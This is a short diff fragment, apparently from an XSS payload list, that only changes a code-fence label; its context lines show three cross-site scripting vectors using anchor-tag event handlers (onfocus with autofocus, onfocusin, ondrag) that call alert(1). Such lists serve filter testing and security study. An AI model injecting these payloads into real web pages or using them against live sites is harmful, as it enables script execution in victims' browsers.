@@ -1,4 +1,4 @@
-```html
+```
 <a autofocus onfocus=alert(1) href></a>
 <a autofocus onfocusin=alert(1) href></a>
 <a draggable="true" ondrag="alert(1)">test</a>
